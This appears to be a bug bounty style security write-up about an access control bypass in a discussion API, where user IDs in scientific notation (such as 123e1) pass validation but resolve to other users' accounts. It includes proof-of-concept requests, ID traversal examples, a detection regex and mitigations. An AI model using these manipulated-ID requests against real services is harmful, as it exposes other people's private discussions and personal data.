# 🔓 Access Control Bypass via E-Notation Numeric Parsing Confusion

> Security research repository documenting a critical Access Control vulnerability where inconsistent numeric parsing and E-Notation handling enabled unauthorized access to sensitive user discussions containing Personally Identifiable Information (PII).

---

# 📖 Description

During security testing of a large multi-user platform, a vulnerability was identified in the application's discussion functionality.

The application exposed user discussions through an API endpoint that utilized numeric user identifiers.

Although traditional IDOR attempts were properly blocked by access control checks, inconsistent handling of numeric representations between backend components allowed attackers to bypass authorization controls using **scientific notation (E-Notation)**.

By supplying specially crafted user IDs, an attacker could manipulate backend processing and retrieve discussions belonging to other users, resulting in unauthorized access to sensitive PII and internal communications.

---

# 🎯 Vulnerability Overview

| Field                   | Value                                   |
| ----------------------- | --------------------------------------- |
| Vulnerability Type      | Access Control Bypass                   |
| Secondary Issue         | IDOR                                    |
| Severity                | Critical                                |
| Attack Vector           | Remote                                  |
| Authentication Required | Yes                                     |
| User Interaction        | None                                    |
| Impact                  | Unauthorized Access to User Discussions |
| Data Exposure           | PII, Internal Communications            |

---

# ⚠️ Vulnerable Component

## Discussion API

### Endpoint Pattern

```http
GET /api/v1/user/{user_id}/discussions
```

---

## Intended Security Behavior

The application should only allow users to access discussions associated with their own account.

### Expected Response

```http
GET /api/v1/user/123/discussions
```

Returns:

```json
{
  "user": 123,
  "discussions": [...]
}
```

---

## Access Control Protection

When a user attempted to access another user's discussions:

```http
GET /api/v1/user/999/discussions
```

The application correctly returned:

```http
403 Forbidden
```

---

# 🔬 Root Cause Analysis

The vulnerability resulted from inconsistent handling of numeric values across multiple backend systems.

---

## Frontend Validation

The access control mechanism validated only the initial numeric portion of the supplied user ID.

Examples:

```text
123
123.0
123.2
123e1
```

All began with:

```text
123
```

and therefore passed validation.

---

## Backend Processing

The backend interpreted the entire value as a valid numeric expression.

Examples:

```text
123e0 = 123
123e1 = 1230
123.1e1 = 1231
123.2e1 = 1232
```

As a result:

* Authorization checked User 123
* Backend retrieved User 1230

This mismatch enabled access control bypass.

---

# 🔥 Exploitation Technique

## Phase 1 — Endpoint Analysis

The target endpoint accepted a user ID parameter.

Example:

```http
GET /api/v1/user/123/discussions
```

---

## Phase 2 — Numeric Representation Testing

Different formats were tested.

### Valid Responses

```text
123
123.0
123.2
```

Returned:

```http
200 OK
```

---

### Rejected Formats

```text
123aaa
123+1
123/1
123*1
```

Returned:

```http
400 Bad Request
```

---

## Phase 3 — Scientific Notation Discovery

E-Notation was introduced.

### Examples

```text
123e0 = 123
123e1 = 1230
123.1e1 = 1231
123.2e1 = 1232
```

---

## Phase 4 — Authorization Bypass

Request:

```http
GET /api/v1/user/123e1/discussions
```

Validation Layer:

```text
Validated User = 123
```

Backend:

```text
Resolved User = 1230
```

Result:

```http
200 OK
```

Discussions belonging to another user were returned.

---

# 🧪 Proof of Concept

## Authorized Request

```http
GET /api/v1/user/123/discussions
```

Response:

```http
200 OK
```

Returns discussions belonging to User 123.

---

## Unauthorized Access Attempt

```http
GET /api/v1/user/1230/discussions
```

Response:

```http
403 Forbidden
```

---

## Access Control Bypass

```http
GET /api/v1/user/123e1/discussions
```

Response:

```http
200 OK
```

Returns discussions belonging to User 1230.

---

# 🔄 Traversal Examples

## Higher User IDs

```text
123e1    → 1230
123.1e1  → 1231
123.2e1  → 1232
123.9e1  → 1239
```

---

## Lower User IDs

Certain edge cases allowed traversal to smaller IDs.

```text
123e-1 → 12.3 → User 12
123e-2 → 1.23 → User 1
```

---

# 💥 Impact

## Confidentiality Impact

### Critical

Attackers could access:

* Private Discussions
* Internal Communications
* Personally Identifiable Information (PII)
* Support Conversations
* Customer Records

---

## Integrity Impact

### High

Potential unauthorized interaction with discussion functionality.

Possible actions:

* Reading restricted discussions
* Monitoring sensitive communications
* Collecting customer information

---

## Privacy Impact

### Critical

Exposure of:

* Names
* Contact Information
* Account Details
* Sensitive Business Information

---

## Business Impact

### High

Potential consequences include:

* Regulatory Compliance Violations
* GDPR Violations
* Customer Trust Loss
* Reputational Damage

---

# 🔍 Detection Opportunities

## API Monitoring

Monitor requests containing:

```text
e
e+
e-
```

within numeric identifiers.

Examples:

```text
123e1
456e-2
999.5e1
```

---

## Access Control Logs

Look for:

* Unusual User ID Formats
* Scientific Notation Usage
* Cross-Account Access Attempts

---

## Threat Hunting

Search logs for:

```regex
[0-9]+(\.[0-9]+)?e[-+]?[0-9]+
```

---

# 🛡️ Mitigation

## Strict Input Validation

Accept only:

```regex
^[0-9]+$
```

Reject:

```text
123.0
123e1
123e-2
123.5e1
```

---

## Consistent Numeric Parsing

Ensure:

* Validation Layer
* Authorization Layer
* Backend Services

all process identifiers identically.

---

## Server-Side Authorization

Never trust:

* URL Parameters
* User-Supplied IDs

Always verify ownership before retrieving data.

---

## Security Testing

Include testing for:

* Alternate Numeric Formats
* Scientific Notation
* Integer Conversion Edge Cases
* Parsing Inconsistencies

---

# 📚 References

## Security Concepts

* Insecure Direct Object Reference (IDOR)
* Broken Access Control
* Numeric Parsing Vulnerabilities
* Type Confusion Vulnerabilities

---

## OWASP Resources

* OWASP Top 10 – Broken Access Control
* OWASP API Security Top 10
* OWASP Testing Guide



---

# ⚠️ Disclaimer

This repository is intended for:

* Security Research
* Defensive Security Training
* Vulnerability Analysis
* Bug Bounty Learning
* Authorized Security Testing

All testing must be performed only on systems where explicit authorization has been granted.
